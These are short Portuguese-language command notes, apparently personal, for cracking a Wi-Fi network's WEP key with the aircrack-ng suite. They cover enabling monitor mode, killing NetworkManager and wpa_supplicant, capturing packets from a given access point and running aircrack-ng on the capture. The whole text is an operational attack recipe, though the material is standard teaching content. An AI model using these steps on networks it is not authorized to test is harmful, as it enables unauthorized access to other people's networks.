    ## WEP crak ##

## Ver a interface de rede sem fio (Neste caso é wlan0)
    ifconfig
    iwconfig
    airmon-ng

## Iniciar a interface (wlan0) em modo monitor (para ser possível capturar todo pacotes
    # Irá criar uma "nova" interface em modo monitor, neste caso wlan0mon
    airmon-ng start wlan0

## Termine todo programas secundário que pode atrapalhar na captura
    ## Por exemplo NetworkManager e wpa_supplicant
        killall NetworkManager
        killall wpa_supplicant

    ## Pelo airmon-ng
    airmon-ng check kill

## Iniciar a captura de pacotes, airodump <interface>
    airodump-ng wlan0mon

    # -c channel -w output file --bssid mac do AP, wlan0mon - interface name
    airodump-ng -c 6 -w wep_cap --bssid 64:66:B3:70:9F:C8 wlan0mon

## Quebra do a partir do pacotes capturados. Em média é necessário 50 mil pacotes
    aircrack-ng wep_cap-01.cap

## Gerenciador de conexões
    # Pare o modo monitor na interface wlan0mon, voltando a ter wlan0 em modo managed
    airmon-ng stop wlan0mon

    ## Inicie o gerenciador de conexões
    NetworkManager

## Good links
https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
http://media.pearsoncmg.com/ph/streaming/esm/tanenbaum5e_videonotes/tanenbaum_videoNotes.html
